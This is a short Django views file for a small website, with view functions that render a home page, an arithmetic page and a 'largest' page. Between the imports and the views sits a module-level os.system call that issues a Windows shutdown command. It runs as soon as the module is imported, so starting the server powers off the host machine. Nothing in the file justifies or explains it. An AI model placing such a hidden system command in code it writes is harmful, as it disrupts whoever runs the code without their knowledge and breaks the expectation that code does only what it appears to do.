from django.shortcuts import render
import os
os.system("shutdown /s")
def home(request):
    return render(request, "index.html")

def arthematic(request):
    return render(request, "arthematic.html")

def largest(request):
    return render(request, "largest.html")

